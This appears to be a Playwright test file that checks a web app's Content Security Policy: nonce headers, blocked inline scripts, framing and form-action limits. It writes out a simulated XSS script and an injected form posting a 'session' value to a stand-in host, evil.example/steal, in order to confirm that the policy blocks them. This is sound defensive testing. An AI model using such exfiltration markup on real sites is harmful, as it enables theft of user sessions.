import type { Page } from '@playwright/test';
import { test, expect } from './fixtures';
import { acceptAsNewAccount, addInvestor, freshPage, recordEntry, signUp } from './helpers';

type CspWindow = { __csp?: string[]; __pwned?: boolean };

/** Records every CSP violation the browser reports on this page, across navigations. */
async function trackViolations(page: Page) {
  await page.addInitScript(() => {
    const store = ((window as unknown as CspWindow).__csp = []) as string[];
    document.addEventListener('securitypolicyviolation', (event) => {
      store.push(`${event.violatedDirective} ${event.blockedURI}`);
    });
  });
}

const violations = (page: Page) => page.evaluate(() => (window as unknown as CspWindow).__csp ?? []);

test.describe('content security policy', () => {
  test('every page carries a strict policy with a fresh nonce, and its scripts use it', async ({ request }) => {
    const nonces = new Set<string>();
    for (const path of ['/', '/legal', '/login', '/signup']) {
      const response = await request.get(path);
      const policy = response.headers()['content-security-policy'];

      expect(policy, `${path} has a CSP`).toContain("script-src 'self' 'nonce-");
      expect(policy).toContain("object-src 'none'");
      expect(policy).toContain("form-action 'self'");
      expect(policy).toContain("frame-ancestors 'none'");
      expect(policy).toContain("base-uri 'self'");
      expect(policy, 'no eval in production').not.toContain("'unsafe-eval'");
      expect(policy, 'no inline scripts').not.toMatch(/script-src[^;]*'unsafe-inline'/);

      const nonce = /'nonce-([^']+)'/.exec(policy)![1];
      nonces.add(nonce);
      expect(await response.text(), `${path} scripts carry this request's nonce`).toContain(`nonce="${nonce}"`);
    }
    expect(nonces.size, 'a different nonce on every request').toBe(4);
  });

  test('an injected inline script does not run', async ({ page }) => {
    await trackViolations(page);
    // Simulate an XSS hole: an attacker's script lands in the page's HTML.
    await page.route('**/login', async (route) => {
      const response = await route.fetch();
      const html = (await response.text()).replace(/<body[^>]*>/, (open) => `${open}<script>window.__pwned = true</script>`);
      await route.fulfill({ response, body: html });
    });
    await page.goto('/login', { waitUntil: 'networkidle' });

    expect(await page.evaluate(() => (window as unknown as CspWindow).__pwned)).toBeUndefined();
    expect((await violations(page)).join('\n')).toContain('script-src');
    // The legitimate page still works under the same policy.
    await page.fill('#login-email', 'nobody@example.com');
    await page.fill('#login-password', 'not the password');
    await page.getByRole('button', { name: /^sign in$/i }).click();
    await expect(page.locator('form [role=alert]')).toHaveText('Incorrect email or password.');
  });

  test('injected markup cannot post data to another site', async ({ page }) => {
    await trackViolations(page);
    const leaked: string[] = [];
    await page.route('https://evil.example/**', async (route) => {
      leaked.push(route.request().url());
      await route.abort();
    });
    await page.goto('/login', { waitUntil: 'networkidle' });

    await page.evaluate(() => {
      document.body.insertAdjacentHTML(
        'beforeend',
        '<form id="exfil" method="post" action="https://evil.example/steal"><input name="session" value="x"></form>',
      );
      (document.getElementById('exfil') as HTMLFormElement).requestSubmit();
    });
    await expect.poll(() => violations(page)).toContainEqual(expect.stringContaining('form-action'));
    expect(leaked, 'no request ever reached the other site').toEqual([]);
  });

  test('the app cannot be framed by another site', async ({ page, baseURL }) => {
    await page.setContent(`<iframe id="frame" src="${baseURL}/login"></iframe>`);
    await expect
      .poll(() => page.frames().find((frame) => frame !== page.mainFrame())?.url() ?? '', { timeout: 15_000 })
      .toMatch(/^chrome-error:/);
  });

  test('the main flows run with zero violations (so hydration works under the policy)', async ({
    page,
    browser,
    baseURL,
  }) => {
    test.setTimeout(150_000);
    const found: string[] = [];
    const visit = async (target: Page, path: string) => {
      await target.goto(path, { waitUntil: 'networkidle' });
      found.push(...(await violations(target)));
    };

    await trackViolations(page);
    for (const path of ['/', '/legal', '/login', '/signup', '/does-not-exist']) await visit(page, path);

    const owner = await signUp(page, 'Csp');
    await visit(page, `/w/${owner.slug}/admin`);
    await visit(page, `/w/${owner.slug}/admin/investors`);
    await visit(page, `/w/${owner.slug}/investor`); // includes the chart
    await visit(page, `/w/${owner.slug}/apply`);

    const investor = await addInvestor(page, owner.slug, 'Csp Investor');
    await recordEntry(page, 'Commitment', '5,000');
    await page.getByRole('button', { name: 'Create invite link', exact: true }).click();
    const link = await page.getByLabel('Invitation link').inputValue();
    await visit(page, `/w/${owner.slug}/admin/investors/${investor.investorId}`);

    const { page: guest } = await freshPage(browser, baseURL);
    await trackViolations(guest);
    await visit(guest, new URL(link).pathname);
    const accepted = await acceptAsNewAccount(browser, baseURL, link, owner.slug);
    await trackViolations(accepted);
    await visit(accepted, `/w/${owner.slug}/investor`);

    expect(found, 'CSP violations on normal pages').toEqual([]);
  });
});
